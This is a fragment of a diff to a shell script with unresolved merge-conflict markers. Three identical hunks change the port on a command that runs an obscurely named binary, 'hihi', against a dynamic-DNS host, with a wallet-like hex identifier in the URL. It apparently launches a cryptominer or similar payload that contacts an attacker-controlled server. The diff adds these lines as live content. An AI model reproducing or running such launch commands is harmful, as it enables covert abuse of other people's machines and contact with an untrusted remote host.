@@ -19,7 +19,7 @@ chmod +x hihi
 <<<<<<< HEAD
 ./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
 =======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
 >>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
 
 
@@ -30,7 +30,7 @@ chmod +x hihi
 <<<<<<< HEAD
 ./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
 =======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
 >>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
 
 fi
@@ -43,6 +43,6 @@ chmod +x hihi
 <<<<<<< HEAD
 ./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
 =======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
 >>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
 exit 0
